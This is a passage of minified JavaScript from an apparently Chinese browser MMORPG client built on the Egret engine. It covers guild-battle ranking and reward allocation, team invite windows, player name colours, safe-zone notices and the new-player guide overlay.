color='{1}'>{0}</font>已经吞噬了{2}\n",f,n.ColorUtil.RED,"<font color='"+n.ColorUtil.GREEN+"'>"+g+"</font>"),p+=gettext("可前往<font color={0}>吞噬装备界面</font>查看详细信息",n.ColorUtil.RED)),win.open(e,m,p)},e}(o.BaseView);e.TunTianSettleTips=l,window.TunTianSettleTips=l,__reflect(l.prototype,"TunTianSettleTips",[]),window.TunTianSettleTips=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AllotInfo=e.SelectInfoData=e.GuildFlag=e.PointRewarddInfo=e.WarRankInfo=e.WinGuildInfo=e.MyRankGuildInfo=e.RankGuildInfo=e.GuildRedRobInfo=e.GuildBattleModel=void 0;var n=i(8),o=i(0),s=i(15),a=i(4),r=i(20),l=i(30),h=i(107),u=i(28),p=i(12),d=i(7),c=i(2),f=i(51),g=function(t){function e(){var e=t.call(this)||this;return e.guildPoint=0,e._ownPoint=0,e.gongXun=0,e.personRankList=[],e.tempRewardDic={},e.guildRank=0,e.singinStatus=0,e.rewardDay=1,e.remainYB=-1,e.robYbNum=0,e.guildRankList=[],e.killName="",e.killGuild="",e.cityOwn=gettext("虚位以待"),e.myRankList=[],e.weixieList=[],e.canPlayList=[],e.flagStatu=0,e.endTime=0,e._flagGuild="",e.canClick=!0,e._canSendReward=!1,e.rewardIndex=0,e.sendList=[],e.sendNumList=[],e.rewardFlag=0,e.allotInfoList={},e.winGuildInfo=new C,e.guildWarNumDaXie=[gettext("日"),gettext("一"),gettext("二"),gettext("三"),gettext("四"),gettext("五"),gettext("六")],e.rankList=[],e._doorEndtime=0,e.attHandle=0,e.myGuildPointRank=[],e.guildHandleList=[],e.guildNum=0,e._rankMax=0,e}return __extends(e,t),Object.defineProperty(e.prototype,"ownPoint",{get:function(){return this._ownPoint},set:function(t){this._ownPoint=t},enumerable:!1,configurable:!0}),e.prototype.creatGuildRankReward=function(t,e){void 0===e&&(e=-1),this.rewardList=[];var i=o.GlobalConfig.GuildBattleDistributionAward[t];for(var n in i)if(!i[n].rewardFlag||this.rewardFlag==w.hf){if(Number(n)==e+1)return i[n].awardShow;var s=i[n].awardShow;for(var a in s)this.checkIsHave(s[a])}return this.rewardList},e.prototype.getLeftCnt=function(){var t=0;for(var e in this.tempRewardDic)this.tempRewardDic[e]&&(t+=this.tempRewardDic[e]);return this.canAllotCnt-t},e.prototype.setTempRewardCnt=function(t,e){this.tempRewardDic[t]=e},e.prototype.getTempRewardCnt=function(t){return this.tempRewardDic[t]||(this.tempRewardDic[t]=0),this.tempRewardDic[t]},e.prototype.getScore=function(t){for(var e=0,i=this.personRankList;e<i.length;e++){var n=i[e];if(t==n.id)return n.guildPoint}return 0},e.prototype.creatGuildRewardList=function(){if(this.configList)return this.configList;this.configList=[];var t=o.GlobalConfig.GuildBattleDistributionAward;for(var e in t)-1==this.configList.lastIndexOf(t[e][1].rank)&&this.configList.push(t[e][1].rank);return this.configList},e.prototype.checkIsHave=function(t){for(var e=!1,i=this.rewardList.length,n=0;i>n;n++){var o=this.rewardList[n];o.id==t.id&&o.type==t.type&&(e=!0,this.rewardList[n].count+=t.count)}e||this.rewardList.push(t)},e.prototype.getRedbagInfo=function(t){this.remainYB=t.readInt(),this.canSend=t.readBoolean(),this.canRod=t.readBoolean(),this.sendYbNum=t.readInt(),this.maxRedNum=t.readInt(),this.remainRedNum=t.readInt();var e=t.readInt();this.rebList=[];for(var i,n=0;e>n;n++)i=new m,i.parse(t),a.ActorCC.actorID==i.acId&&(this.robYbNum=i.robNum),this.rebList.push(i)},e.prototype.isHaveRedBag=function(){return this.canSend||this.canRod},e.prototype.checkinAppoint=function(t,e){if(void 0===t&&(t=0),void 0===e&&(e=!1),!f.GuildBattleCT.ins().getModel().isWatStart||0==r.GameMap.fubenID||0==u.Guild.ins().guildID)return!1;var i=o.GlobalConfig.GuildBattleLevel;for(var n in i)if(i[n].fbId==r.GameMap.fubenID)return 0==t?!0:e&&i[n].id>=t?!0:i[n].id==t?!0:!1;return!1},e.prototype.decodeGuildRankInfo=function(t,e){var i=t.readInt();this.guildRankList=[];for(var n,o=0;i>o;o++)n=new v,n.parse(t,e),this.guildRankList.push(n);f.GuildBattleCT.ins().postGuildRankInfo()},e.prototype.getNextMapName=function(t){void 0===t&&(t=1);var e=(r.GameMap.fubenID,o.GlobalConfig.GuildBattleLevel),i=1;for(var n in e)t==e[n].id&&(i=t);return e[i].name},e.prototype.getIntoNextMapGongxun=function(){var t=r.GameMap.fubenID,e=o.GlobalConfig.GuildBattleLevel,i=1;for(var n in e)if(t==e[n].fbId){if(!(e[n].id<4))return 0;i=e[n].id+1}return e[i].feats},e.prototype.getMapLevelInfo=function(){var t=r.GameMap.fubenID,e=o.GlobalConfig.GuildBattleLevel,i=1;for(var n in e)t==e[n].fbId&&(i=e[n].id);return e[i]},e.prototype.decodeMyGuildRankInfo=function(t){var e=t.readInt();this.myRankList=[];for(var i,n=0;e>n;n++)i=new y,i.parse(t),this.myRankList.push(i);f.GuildBattleCT.ins().postMyRankChange()},e.prototype.changeWeiXieList=function(t,e,i){if(void 0===e&&(e=!0),void 0===i&&(i=""),a.ActorCC.handle!=t){var n=this.checkListElements(t,this.weixieList);e?-1==n&&(this.weixieList.push(t),c.TipsCT.ins().showTips("|C:0xf3311e&T:"+i+gettext(" 正在攻击你|"))):-1!=n&&this.weixieList.splice(n,1),f.GuildBattleCT.ins().postWeixieChange(0)}},e.prototype.changecanPlayList=function(t,e){if(void 0===e&&(e=!0),a.ActorCC.handle!=t){var i=this.checkListElements(t,this.canPlayList);e?-1==i&&this.canPlayList.push(t):-1!=i&&this.canPlayList.splice(i,1),f.GuildBattleCT.ins().postCanplayChange()}},Object.defineProperty(e.prototype,"flagGuild",{get:function(){return this._flagGuild},set:function(t){this._flagGuild=t,""!=t&&void 0!=t&&this.endTime>0&&0!=this.flagStatu&&(Timer.stop(this.reduceHoldTime,this),Timer.start(1e3,this.endTime,this.reduceHoldTime,this))},enumerable:!1,configurable:!0}),e.prototype.reduceHoldTime=function(){if(3!=this.flagStatu){if(1==this.flagStatu)return void Timer.stop(this.reduceHoldTime,this);this.endTime--,this.endTime<=0&&Timer.stop(this.reduceHoldTime,this)}},e.prototype.decodeGulidWarResult=function(t){t.readString(),t.readInt(),t.readInt(),t.readInt(),t.readInt()},e.prototype.checkListElements=function(t,e){if(e.length<=0)return-1;for(var i=0;i<e.length;i++)if(e[i]==t)return i;return-1},e.prototype.getRewardByPoint=function(t){var e=[];if(!this.dataList){this.dataList=[];var i=o.GlobalConfig.GuildBattlePersonalAward;for(var n in i)this.dataList.push(i[n])}for(var s=this.dataList.length,a=0;s>a;a++)t>=this.dataList[a].integral&&(e=e.concat(l.RewardData.objectsToRewardDatas(this.dataList[a].award)));return e},e.prototype.getMyPointReward=function(){var t,e=o.GlobalConfig.GuildBattlePersonalAward;for(var i in e)if(t=e[i],t.id==this.pointInfo.id)return t;return null},e.prototype.getMaxReward=function(){var t,e,i=o.GlobalConfig.GuildBattlePersonalAward,n=0;for(var s in i)t=i[s],t.integral>n&&(n=t.integral,e=t);return e},Object.defineProperty(e.prototype,"clickTime",{get:function(){return this._clickTime},set:function(t){this.canClick=!1,this._clickTime=t,Timer.stop(this.endTimeChangeStatu,this),Timer.start(1e3,this._clickTime,this.endTimeChangeStatu,this)},enumerable:!1,configurable:!0}),e.prototype.endTimeChangeStatu=function(){--this._clickTime,this._clickTime<=0&&(this.canClick=!0,Timer.stop(this.endTimeChangeStatu,this))},Object.defineProperty(e.prototype,"canSendReward",{get:function(){return u.Guild.ins().myOffice==h.GuildOffice.GUILD_BANGZHU&&this._canSendReward},set:function(t){this._canSendReward=t},enumerable:!1,configurable:!0}),e.prototype.getCanSendNumByRank=function(t){void 0===t&&(t=-1);var e=o.GlobalConfig.GuildBattleDistributionAward[this.guildWarRank],i=0;for(var n in e)if(!e[n].rewardFlag||this.rewardFlag==w.hf){if(n==t+1+"")return e[n].count;++i}return i},e.prototype.checkISSendAll=function(){for(var t=this.getCanSendNumByRank(),e=0;t>e;e++){var i=this.getCanSendNumByRank(e);if(!this.sendList[e])return c.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:|请先选择需要分配奖励的成员")),!1;for(var n=0,o=0;o<this.sendNumList[e].length;o++)n+=this.sendNumList[e][o];if(i>n)return c.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:|请先选择需要分配奖励的成员")),!1;for(var o=0;o<this.sendList[e].length;o++)if(!u.Guild.ins().checkIsInGuild(this.sendList[e][o].roleID))return c.TipsCT.ins().showTips("|C:0xf3311e&T:|"+this.sendList[e][o].name+gettext(" 已退出公会")),!1}return!0},Object.defineProperty(e.prototype,"actLeftTime",{get:function(){return this._actLeftTime},set:function(t){this._actLeftTime=t,this._actLeftTime>0&&(Timer.stop(this.reduceTime,this),Timer.start(1e3,t,this.reduceTime,this))},enumerable:!1,configurable:!0}),e.prototype.checkShowEnter=function(){return this.checkActIsOpen()},e.prototype.reduceTime=function(){--this._actLeftTime,this._actLeftTime<=0&&(Timer.stop(this.reduceTime,this),f.GuildBattleCT.ins().guildBattleEnd())},e.prototype.setOpenDesc=function(){var t=d.GameServerCC.isInOtherPlayTime()?o.GlobalConfig.GuildBattleConst.open2:o.GlobalConfig.GuildBattleConst.open,e=n.DateUtils.countNextWeekTimes(t.week,t.hours,t.min),i=n.DateUtils.getFormatBySecond(e,n.DateUtils.TIME_FORMAT_19)+("  "+n.DateUtils.formatTimeNum(t.hours)+":"+n.DateUtils.formatTimeNum(t.min));return i},e.prototype.getCdByType=function(t){if(0==r.GameMap.fubenID)return 0;var e=o.GlobalConfig.GuildBattleLevel;for(var i in e)if(e[i].fbId==r.GameMap.fubenID&&(1==t||3==t))return e[i].switchSceneCd;return 0},e.prototype.getIsShowGuildWarBtn=function(){if(0==this.startTime||o.GlobalConfig.GuildBattleConst.openLevel>a.ActorCC.level)return 0;var t=new Date(1e3*this.startTime),e=new Date(d.GameServerCC.serverTime);return t.getDate()==e.getDate()&&(e.getHours()<20||20==e.getHours()&&e.getMinutes()<=15)||this.isWatStart?1:0
},e.prototype.rankListChange=function(t){var e=t.readInt();this.rankList=[];for(var i,n=0;e>n;n++)i=new T,i.parse(t),this.rankList.push(i);f.GuildBattleCT.ins().postRankListChange()},e.prototype.decodePointRewardInfo=function(t){this.pointInfo||(this.pointInfo=new b),this.pointInfo.parse(t),f.GuildBattleCT.ins().postPointRewardChange()},e.prototype.getSelectDataByIndex=function(t){var e,i,n=[];if(this.sendList&&this.sendList[t]&&this.sendList[t].length>0){e=this.sendList[t],i=this.sendNumList[t];for(var o=void 0,s=0;s<e.length;s++)o=new I,o.data=e[s],o.num=i[s],n.push(o)}return n},e.prototype.getMyPointRankReward=function(t){var e=o.GlobalConfig.GuildBattlePersonalRankAward;for(var i in e)if(e[i].rank==t)return e[i].award;return[]},e.prototype.doEndDoorTime=function(t){this._doorEndtime=t,Timer.stop(this.timeDo,this),Timer.start(1e3,this._doorEndtime,this.timeDo,this)},e.prototype.timeDo=function(){--this._doorEndtime,this._doorEndtime<=0&&(this._doorEndtime=0,Timer.stop(this.timeDo,this))},Object.defineProperty(e.prototype,"doorEndtime",{get:function(){return this._doorEndtime},enumerable:!1,configurable:!0}),e.prototype.getMyGuildPointRank=function(){var t,e,i=u.Guild.ins().getGuildMembers(0),n=i.length;this.myGuildPointRank=[];for(var o=0;n>o;o++)t=i[o],e=new I,e.data=t,e.num=this.getPointByAcId(t.roleID),this.myGuildPointRank.push(e);return this.myGuildPointRank.sort(this.sort),this.myGuildPointRank},e.prototype.getPointByAcId=function(t){for(var e=this.myRankList.length,i=0;e>i;i++)if(this.myRankList[i].roleId==t)return this.myRankList[i].point;return 0},e.prototype.sort=function(t,e){var i=t.num,n=e.num;return i>n?-1:n>i?1:0},e.prototype.setMyGuildNum=function(t,e){void 0===e&&(e=!0);var i=this.checkListElements(t,this.guildHandleList);e?-1==i&&this.guildHandleList.push(t):i>-1&&this.guildHandleList.splice(i,1),this.guildNum=this.guildHandleList.length,f.GuildBattleCT.ins().postGuildNumChange()},e.prototype.clearGuildWarList=function(){this.checkinAppoint()&&(this.weixieList=[],this.canPlayList=[],this.attHandle=0,this.guildHandleList=[])},e.prototype.checkActIsOpen=function(){return p.OpenSystem.ins().checkSysOpen(s.SystemType.GuildBattle)&&f.GuildBattleCT.ins().getModel().isWatStart&&f.GuildBattleCT.ins().getModel().actLeftTime>0?!0:!1},e.prototype.countEnterRp=function(){return u.Guild.ins().guildID<=0?!1:this.checkActIsOpen()},e.prototype.countDailyRewardRp=function(){if(!p.OpenSystem.ins().checkSysOpen(s.SystemType.GuildBattle))return!1;var t=f.GuildBattleCT.ins().getModel().winGuildInfo;if(!t)return!1;var e=u.Guild.ins().guildID;if(e!=t.guildId)return!1;var i=f.GuildBattleCT.ins().getModel().singinStatus;return 1==i},e.prototype.getRankSection=function(){if(0==this._rankMax){for(var t=1,e=o.GlobalConfig.GuildBattleDistributionAward;e[t];)t++;this._rankMax=--t}return this._rankMax},e.prototype.countRewardAllotRp=function(){var t,e,i;if(!p.OpenSystem.ins().checkSysOpen(s.SystemType.GuildBattle))return!1;var n=this.checkCanAllotReward();if(!n)return!1;var a=o.GlobalConfig.GuildBattleDistributionAward[this.guildRank];if(!a||0==a.length)return!1;var r=[];for(var l in a){var h=a[l],u=0;if((null===(t=f.GuildBattleCT.ins().getModel())||void 0===t?void 0:t.allotInfoList[h.rank])&&(null===(e=f.GuildBattleCT.ins().getModel())||void 0===e?void 0:e.allotInfoList[this.guildRank][h.id])&&(r=null===(i=f.GuildBattleCT.ins().getModel())||void 0===i?void 0:i.allotInfoList[h.rank][h.id],r&&r.length>0))for(var d=0,c=r;d<c.length;d++){var g=c[d];u+=g.cnt}if(h.count>u)return!0}return!1},e.prototype.checkCanAllotReward=function(){if(!p.OpenSystem.ins().checkSysOpen(s.SystemType.GuildBattle))return!1;if(u.Guild.ins().guildID<=0)return!1;if(u.Guild.ins().myOffice!=h.GuildOffice.GUILD_BANGZHU)return!1;var t=this.guildRank,e=this.getRankSection();return t>0&&e>=t},e}(egret.HashObject);e.GuildBattleModel=g,window.GuildBattleModel=g,__reflect(g.prototype,"GuildBattleModel",[]),window.GuildBattleModel=g;var m=function(){function t(){}return t.prototype.parse=function(t){this.robNum=t.readInt(),this.robName=t.readString(),this.acId=t.readInt()},t}();e.GuildRedRobInfo=m,window.GuildRedRobInfo=m,__reflect(m.prototype,"GuildRedRobInfo",[]),window.GuildRedRobInfo=m;var v=function(){function t(){}return t.prototype.parse=function(t,e){this.id=t.readInt(),this.type=e,0==e?(this.guildName=t.readString(),this.ownName=t.readString()):(this.ownName=t.readString(),this.guildName=t.readString()),this.guildPoint=t.readInt()},t}();e.RankGuildInfo=v,window.RankGuildInfo=v,__reflect(v.prototype,"RankGuildInfo",[]),window.RankGuildInfo=v;var y=function(){function t(){}return t.prototype.parse=function(t){this.roleId=t.readInt(),this.name=t.readString(),this.cardId=t.readInt(),this.point=t.readInt()},t}();e.MyRankGuildInfo=y,window.MyRankGuildInfo=y,__reflect(y.prototype,"MyRankGuildInfo",[]),window.MyRankGuildInfo=y;var C=function(){function t(){this.guildId=0,this.guildName="",this.guildOwnName="",this.guildOwnId=0,this.guildOwnJob=0}return t.prototype.parse=function(t){this.guildId=t.readInt(),this.guildName=t.readString(),this.guildOwnName=t.readString(),this.guildOwnId=t.readInt(),this.guildOwnJob=t.readByte()},t}();e.WinGuildInfo=C,window.WinGuildInfo=C,__reflect(C.prototype,"WinGuildInfo",[]),window.WinGuildInfo=C;var T=function(){function t(){}return t.prototype.parse=function(t){this.name=t.readString(),this.point=t.readInt()},t}();e.WarRankInfo=T,window.WarRankInfo=T,__reflect(T.prototype,"WarRankInfo",[]),window.WarRankInfo=T;var b=function(){function t(){}return t.prototype.parse=function(t){this.isCan=t.readBoolean(),this.id=t.readInt(),this.point=t.readInt()},t}();e.PointRewarddInfo=b,window.PointRewarddInfo=b,__reflect(b.prototype,"PointRewarddInfo",[]),window.PointRewarddInfo=b;var w;!function(t){t[t.act=0]="act",t[t.hf=1]="hf",t[t.kf=2]="kf"}(w=e.GuildFlag||(e.GuildFlag={})),window.GuildFlag=w;var I=function(){function t(){}return t}();e.SelectInfoData=I,window.SelectInfoData=I,__reflect(I.prototype,"SelectInfoData",[]);var _=function(){function t(){}return t.prototype.parse=function(t){this.id=t.readByte(),this.actorId=t.readInt(),this.name=t.readString(),this.cnt=t.readShort(),this.job=t.readByte()},t}();e.AllotInfo=_,window.AllotInfo=_,__reflect(_.prototype,"AllotInfo",[]),window.SelectInfoData=I},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BurningDesertInviteWin=void 0;var n=i(1),o=i(4),s=i(7),a=i(2),r=i(75),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamFbInviteSkin",e._deDes="",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._deDes=t[0],this._roomId=t[1],this._burningDesertFbId=t[2],this.input.text=this._deDes,this.input.maxChars=40,this.addTouchEvent(this,this.onTouch)},e.prototype.onTouch=function(t){switch(t.target){case this.worldInviteBtn:var e=r.BurningDesertCT.ins();if(!e.checkCanInvite()){var i=Math.ceil(.001*(e.nextCanInviteTime-s.GameServerCC.serverTime));return void a.TipsCT.ins().showTips(gettext("{0}秒后才能世界邀请",i))}e.reqInvitePlayer(this._deDes+gettext("|E:7,{0},&U:&C:{1}&T:快速加入",this._roomId,65280)),win.close(this)}},e.prototype.getDes=function(){var t=this.input.text?this.input.text:this._deDes,e="[|C:1487615&T:"+o.ActorCC.myName+"|]";return t=t==this._deDes?t.replace(gettext("我"),e):e+t},e}(n.BaseView);e.BurningDesertInviteWin=l,window.BurningDesertInviteWin=l,__reflect(l.prototype,"BurningDesertInviteWin",[]),window.BurningDesertInviteWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.QiyuBossReachRewardWin=void 0;var n=i(1),o=i(11),s=i(0),a=i(35),r=i(335),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="FortuitousRewardShow",e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstReward0.itemRenderer=o.ItemBase,this._baseRewardArr=new eui.ArrayCollection,this.lstReward0.dataProvider=this._baseRewardArr,this.lstReward.itemRenderer=r.QiyuBossReachRewardItem,this._reachRewardArr=new eui.ArrayCollection,this.lstReward.dataProvider=this._reachRewardArr},e.prototype.addDisplay=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var n=e[0],o=a.TaskCT.ins().getReachRewardList(n);this._reachRewardArr.replaceAll(o);var r=null===(t=s.GlobalConfig.AdventureBossConfig[n])||void 0===t?void 0:t.baseReward;this._baseRewardArr.replaceAll(r)},e.prototype.removeDisplay=function(){},e}(n.BaseView);e.QiyuBossReachRewardWin=l,window.QiyuBossReachRewardWin=l,__reflect(l.prototype,"QiyuBossReachRewardWin",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StardomainInviteWin=void 0;var n=i(1),o=i(7),s=i(2),a=i(83),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamFbInviteSkin",e._deDes="",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._deDes=t[0],this._roomId=t[1],this.input.text=this._deDes,this.input.maxChars=40,this.addTouchEvent(this,this.onTouch)},e.prototype.onTouch=function(t){switch(t.target){case this.worldInviteBtn:var e=a.StardomainCT.ins();if(!e.checkCanInvite()){var i=Math.ceil(.001*(e.nextCanInviteTime-o.GameServerCC.serverTime));return void s.TipsCT.ins().showTips(gettext("{0}秒后才能世界邀请",i))}e.reqInvitePlayer(this._deDes+gettext("|E:12,{0},&U:&C:{1}&T:快速加入",this._roomId,65280)),win.close(this)}},e}(n.BaseView);e.StardomainInviteWin=r,window.StardomainInviteWin=r,__reflect(r.prototype,"StardomainInviteWin",[]),window.StardomainInviteWin=r},function(t,e,i){"use strict";function n(){return function(t){var e=t.prototype,i=e.addDisplay;e.updateNameColor=function(){var t,e=this.infoModel,i=e.guildID,n=e.isMy,o=e.teamId,a=(e.handle,e.camp),r=e.name;if(console.log("我的阵营名字颜色，",d.KfArenaSys.ins().myCampId,a),!n&&(p.CityCC.ins().isMyTeamNumber(o)||d.KfArenaSys.ins().checkIsFriend(a)||f.BurningDesertCT.ins().checkIsFriend(a)||g.InvadeCT.ins().checkIsFriend(a)||m.StardomainCT.ins().checkIsFriend(a)))return t=2149168,this.eNameLab.textColor=t,void console.log("队友的名字颜色，",t+"",r);switch(s.CampCC.mode){case s.CampMode.ALL:t=16711680;break;default:t=i&&i==u.Guild.ins().guildID?3764435:16777215}console.log("敌人的名字颜色，",t+"",r),this.eNameLab.textColor=t},e.addDisplay=function(){if(i.call(this),this.infoModel){var t=this.infoModel,e=t.type,n=t.isMy;e!=EntityType.Role||n||(observe(this,this.updateNameColor,s.CampCC.selectMode),observe(this,this.updateNameColor,p.CityCC.ins().doPostTeamPlayerInfo,p.CityCC.ins().postEntityTeamId,d.KfArenaSys.ins().postFbInfo,c.OtherCT.ins().syncCamp),this.updateNameColor())}}}}function o(){return function(t){var e=t.prototype,i=e.$setX,n=e.$setY;e.$setX=function(t){var e=i.call(this,t);return e&&this.moveCamera(a.GameMap.mapID,a.GameMap.fubenID),e},e.$setY=function(t){var e=n.call(this,t);return e&&this.moveCamera(a.GameMap.mapID,a.GameMap.fubenID),e},e.moveCamera=function(t,e){if(this==r.SubRoles.lookAtTar){t==a.GameMap.mapID&&e==a.GameMap.fubenID&&l.GameLogic.ins().moveCamera(this.x,this.y);var i="sefety",n={x:a.GameMap.point2Grip(this.x),y:a.GameMap.point2Grip(this.y)};!this[i]&&a.GameMap.checkSafety(n)?(h.TipsCT.ins().showTips(gettext("|C:0x00ff00&T:进入安全区|")),this[i]=!0):this[i]&&!a.GameMap.checkSafety(n)&&(h.TipsCT.ins().showTips(gettext("|C:0xff0000&T:离开安全区|")),this[i]=!1)}}}}Object.defineProperty(e,"__esModule",{value:!0}),e.mainRoleSyncCamera=e.nameColorLogic=void 0;var s=i(105),a=i(20),r=i(13),l=i(23),h=i(2),u=i(28),p=i(43),d=i(47),c=i(142),f=i(75),g=i(82),m=i(83);e.nameColorLogic=n,window.nameColorLogic=n,e.mainRoleSyncCamera=o,window.mainRoleSyncCamera=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LimitTimeItemData=void 0;var n=i(8),o=function(){function t(){}return t.prototype.parser=function(t){this.id=t.readInt(),this.lastTime=t.readInt()},t.prototype.timeFun=function(){this.lastTime--,this.lastTime<=0&&(this.lastTime=0)},Object.defineProperty(t.prototype,"LastTime",{get:function(){return this.lastTime},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"LastTimeStr",{get:function(){var t=n.DateUtils.getFormatBySecond(this.lastTime,n.DateUtils.TIME_FORMAT_1);return t},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"Id",{get:function(){return this.id},enumerable:!1,configurable:!0}),t}();e.LimitTimeItemData=o,window.LimitTimeItemData=o,__reflect(o.prototype,"LimitTimeItemData",[]),window.LimitTimeItemData=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuideView=void 0;var n=i(702),o=i(21),s=i(703),a=function(t){function e(){var e=t.call(this)||this;return e.rect=new egret.Rectangle(1,1,1,1),e.infoGroup=new eui.Group,e.infoGroup.touchEnabled=!1,e.infoGroup.touchChildren=!1,e.addChild(e.infoGroup),e.mc=new o.MovieClip,e.infoGroup.addChild(e.mc),e.arrowGroup=new eui.Group,e.infoGroup.addChild(e.arrowGroup),e.arrow=new s.GuideArrow,e.arrowGroup.addChild(e.arrow),e}return __extends(e,t),e.prototype.show=function(e,i){void 0===i&&(i=!1),t.prototype.show.call(this,e,i),this.arrow.update(),this.mc.playFile(RES_DIR_EFF+"NoviceEff",-1)},e}(n.GuideViewBase);e.GuideView=a,window.GuideView=a,__reflect(a.prototype,"GuideView",[]),window.GuideView=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuideViewBase=void 0;var n=i(21),o=i(16),s=i(103),a=i(179),r=function(t){function e(){var e=t.call(this)||this;return e.clickCD=!0,e.isBlack=!1,e.otherMc=[],e.rect=new egret.Rectangle(1,1,1,1),e.infoGroup=new eui.Group,e.infoGroup.touchEnabled=!1,e.infoGroup.touchChildren=!1,e.addChild(e.infoGroup),e}return __extends(e,t),e.prototype.drawMask=function(){if(!this.shapeMasks){this.shapeMasks=[];for(var t=0;8>t;t++)this.shapeMasks[t]=new eui.Rect,this.shapeMasks[t].touchEnabled=!0}var e=this.rect,i=e.x,n=e.width,o=s.StageUtils.ins().getWidth()-e.right,a=e.y,r=e.height,l=s.StageUtils.ins().getHeight()-e.bottom;this.drawShape(this.shapeMasks[0],new egret.Rectangle(0,0,i,a)),this.drawShape(this.shapeMasks[1],new egret.Rectangle(e.x,0,n,a)),this.drawShape(this.shapeMasks[2],new egret.Rectangle(e.right,0,o,a)),this.drawShape(this.shapeMasks[3],new egret.Rectangle(0,e.topLeft.y,i,r)),this.drawShape(this.shapeMasks[4],new egret.Rectangle(e.bottomRight.x,e.topLeft.y,o,r)),this.drawShape(this.shapeMasks[5],new egret.Rectangle(0,e.bottomRight.y,i,l)),this.drawShape(this.shapeMasks[6],new egret.Rectangle(e.x,e.bottomRight.y,n,l)),this.drawShape(this.shapeMasks[7],new egret.Rectangle(e.right,e.bottomRight.y,o,l))},e.prototype.drawShape=function(t,e){t.x=e.x,t.y=e.y,t.width=e.width,t.height=e.height,this.addChild(t)},e.prototype.onResize=function(){if(this.target){var t=this.target.localToGlobal();return(this.rect.x!=t.x||this.rect.y!=t.y||this.rect.width!=this.target.width||this.rect.height!=this.target.height)&&(this.refurbish(),this.drawMask()),!1}},e.prototype.onClick=function(t){var e=this;if(this.rect.contains(t.stageX,t.stageY)){this.clickCD&&(this.clickCD=!1,egret.callLater(function(){e.dispatchEventWith(egret.Event.CHANGE)},this));for(var i=0;i<this.otherMc.length;i++)egret.Tween.removeTweens(this.otherMc[i]),o.DisplayUtils.removeFromParent(this.otherMc[i]);this.clicking=!1}else{if(a.GuideUtils.ins().clickOut(),this.clicking)return;this.clicking=!0,this.otherMc.length=2;for(var s=function(t){r.otherMc[t]||(r.otherMc[t]=new n.MovieClip),r.otherMc[t].parent||r.addChild(r.otherMc[t]),r.otherMc[t].scaleX=1,r.otherMc[t].scaleY=1,r.otherMc[t].x=r.infoGroup.x,r.otherMc[t].y=r.infoGroup.y;var e=egret.Tween.get(r.otherMc[t]),i=r;e.wait(240*t).call(function(){i.otherMc[t].playFile(RES_DIR_EFF+"PromptEFF1",1,function(){egret.Tween.removeTweens(i.otherMc[t]),o.DisplayUtils.removeFromParent(i.otherMc[t]),t==i.otherMc.length-1&&(i.clicking=!1)})})},r=this,i=0;i<this.otherMc.length;i++)s(i)}},e.prototype.refurbish=function(){this.show(this.target,this.isBlack)},e.prototype.show=function(t,e){if(void 0===e&&(e=!1),null!=t){this.target=t;var i=t.localToGlobal();this.rect.x=i.x,this.rect.y=i.y,this.rect.width=t.width?t.width:60,this.rect.height=t.height?t.height:60,this.isBlack=e,this.drawMask();for(var n in this.shapeMasks)this.shapeMasks[n].alpha=e?.7:0;this.addChild(this.infoGroup),this.infoGroup.x=i.x+(this.rect.width>>1),this.infoGroup.y=i.y+(this.rect.height>>1);var o=s.StageUtils.ins().getStage();o.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this,!0,0),egret.stopTick(this.onResize,this),egret.startTick(this.onResize,this)}},e.prototype.removeDisplay=function(){this.target=null,this.rect.x=this.rect.y=this.rect.width=this.rect.height=1;var t=s.StageUtils.ins().getStage();t.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this,!0),egret.stopTick(this.onResize,this)},e}(egret.DisplayObjectContainer);e.GuideViewBase=r,window.GuideViewBase=r,__reflect(r.prototype,"GuideViewBase",[]),window.GuideViewBase=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuideArrow=void 0;var n=i(1),o=i(179),s=function(t){function e(e){var i=t.call(this)||this;return i.text=e,i._sn_="guideArrowSkin",i.touchEnabled=!1,i.touchChildren=!1,i}return __extends(e,t),e.prototype.skinComplete=function(){this.lab.text=this.text},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.update()},e.prototype.removeDisplay=function(){egret.Tween.removeTweens(this.parent),egret.Tween.removeTweens(this)},e.prototype.update=function(){if(this.skin){var t=o.GuideUtils.ins().curCfg;if(t){if(!t.tips||""==t.tips)return void(this.visible=!1);egret.Tween.removeTweens(this.parent),this.parent.x=0,this.visible=!0,1==t.direction?(this.currentState="right",egret.Tween.get(this.parent,{loop:!0}).to({x:40},1e3).to({x:0},1e3)):(this.currentState="left",egret.Tween.get(this.parent,{loop:!0}).to({x:-40},1e3).to({x:0},1e3)),this.lab.text=t.tips}}},e}(n.BaseView);e.GuideArrow=s,window.GuideArrow=s,__reflect(s.prototype,"GuideArrow",[]),window.GuideArrow=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CharItemName=void 0;var n=i(0),o=i(10),s=i(36),a=i(31),r=function(t){function e(){var e=t.call(this)||this;return e.touchEnabled=!1,e.touchChildren=!1,e._nameTxt=new 